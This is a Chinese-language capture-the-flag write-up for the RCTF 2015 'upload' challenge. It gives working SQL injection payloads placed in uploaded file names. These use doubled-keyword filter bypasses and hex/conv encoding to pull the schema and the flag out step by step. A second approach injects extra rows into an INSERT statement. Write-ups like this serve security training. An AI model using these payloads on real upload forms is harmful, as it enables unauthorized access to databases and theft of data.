题目网址：<https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4770>

## upload（RCTF 2015）

#### 做法：

利用文件名进行sql注入

#### 思路：

推测后台的insert插入语句为：

`insert into 表名('filename',...) values('你上传的文件名',...);`



构造以下语句进行注入：

`文件名'+(selselectect conv(substr(hex(database()),1,12),16,10))+'.jpg`



拼接后的sql语句为：
`...values('文件名'+(selselectect conv(substr(hex(database()),1,12),16,10))+'.jpg',...);`



> CONV(n,from_radix,to_radix)：用于将n从from_radix进制转到to_radix进制
>
> substr(str,start,length)：将str从start长度为length分割
>
> hex(str)：将str转成十六进制



#### 一点疑问&细节：

1. select、from被过滤，用双写绕过

2. 为什么不直接采用`sselectelect database()`进行注入：

   ​	部分注入回显：

   ​		'+(selselectect dAtabase())+'.jpg 				   		  			      =>  0

   ​		'+(selecselectt substr(dAtabase(),1,12))+'.jpg		 			     =>  0

   ​		'+(selecselectt substr(hex(dAtabase()),1,12))+'.jpg                 =>  7765625

   > 第三句代码应该回显‘7765625f7570’，可能遇到’f‘导致截断，所以需要conv转成十进制输出

3. substr中的长度限制：不限制长度会导致返回值太大，系统使用科学计数法（xx **e** xxxxx）表示。



### 题目限制条件

1. 回显不能出现字母 ---》 转成十进制
2. 要使注入后的语句正确闭合 ---》猜测语句结构，正确闭合
3. 防止回显数据过大使得程序返回科学计数型的结果 ---》 限制回显长度



### 步骤

上传利用语句注入的文件名在上传文件中进行注入，对substr的截取位置由读者自行调整直至获得完整名称

```Mysql
1. 库名
file_name' +(selselectect conv(substr(hex(database()),1,12),16,10))+ '.jpg
# 得到库名：web_upload

2. 表名
file_name'+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = 'web_upload' limit 1,1)),1,12),16,10))+'.jpg
# 得到表名：hello_flag_is_here

3. 字段
file_name'+(seleselectct+conv(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 1,1)),1,12),16,10))+'.jpg
# 得到字段名：i_am_flag

4. 获得数据
file_name'+(seleselectct+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'.jpg
# 得到flag：!!_@m_Th.e_F!lag
```



## 其他做法（更简单）：

如果对表的结构猜测得当，很快就能解决这道题目，参考某dalao的wp中写出的结构：

`(filename.jpg,uid,uid)`

#### 语句构造

在上传文件的时候，网站会回显uid给我们，所以要先上传一个文件，获取uid，觉得网页跳转太快的可以抓包

我们构造`(filename,'uid','uid'),((database()),'uid','uid')#.jpg ','uid','uid');`

拼接后的语句为`(filename,'uid','uid'),((database()),'uid','uid')`

对应的回显就是我们上传文件的filename和database()，说明注入成功

## 步骤

我们对这个语句进行注入构造，uid自行替换

```Mysql
1. 库名
filename','uid','uid'),((database()),'uid','uid')#.jpg
# 例：filename','1661','1661'),((database()),'1661','1661')#.jpg

2. 表名
filename','uid','uid'),((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema = 'web_upload'),'uid','uid')#.jpg
#'--------------------------------分割行

3. 字段名
filename','uid','uid'),((selselectect group_concat(column_name) frfromom information_schema.columns where table_name = 'hello_flag_is_here'),'uid','uid')#.jpg
#'--------------------------------分割行

4. 获得数据
filename','uid','uid'),((selselectect i_am_flag frfromom hello_flag_is_here),'uid','uid')#.jpg

```







参考连接：

<https://www.cnblogs.com/sharpff/p/10728498.html>

<https://blog.csdn.net/qq_42181428/article/details/89345094#upload_168>
